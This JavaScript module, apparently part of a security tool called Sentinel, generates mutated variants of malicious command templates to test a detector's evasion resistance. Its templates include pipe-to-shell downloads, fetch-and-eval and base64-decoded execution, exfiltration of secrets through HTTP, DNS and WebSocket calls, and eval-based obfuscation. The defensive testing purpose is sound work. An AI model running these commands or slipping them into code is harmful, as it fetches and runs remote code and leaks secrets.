/**
 * Sentinel: Adversarial Mutator (v1.0)
 * 
 * Generates mutated variants of known malicious patterns to test evasion resistance.
 */

'use strict';

class AdversarialMutator {
    constructor() {
        this.templates = {
            'EXECUTION_CHAIN': [
                "curl {url} | bash",
                "wget -qO- {url} | sh",
                "node -e \"fetch('{url}').then(r => r.text()).then(eval)\"",
                "python -c \"import os; os.system('curl {url} | bash')\"",
                "echo {base64} | base64 -d | bash",
                "exec(Buffer.from('{base64}', 'base64').toString())",
                "{nodeInline}"
            ],
            'EXFILTRATION': [
                "fetch('{url}?d=' + process.env.SECRET)",
                "dns.lookup(process.env.SECRET + '.{domain}')",
                "new WebSocket('ws://{domain}').send(process.env.SECRET)",
                "require('https').get('{url}/' + Buffer.from(process.env.SECRET).toString('hex'))"
            ],
            'OBFUSCATION': [
                "eval(String.fromCharCode({codes}))",
                "const x = '{reversed}'.split('').reverse().join(''); eval(x)",
                "eval('\\x{hex}')"
            ]
        };
    }

    generate(type, params = {}) {
        const list = this.templates[type] || [];
        return list.map(tpl => {
            let res = tpl;
            for (const [k, v] of Object.entries(params)) {
                res = res.replace(new RegExp(`{${k}}`, 'g'), v);
            }
            return res;
        });
    }
}

module.exports = new AdversarialMutator();
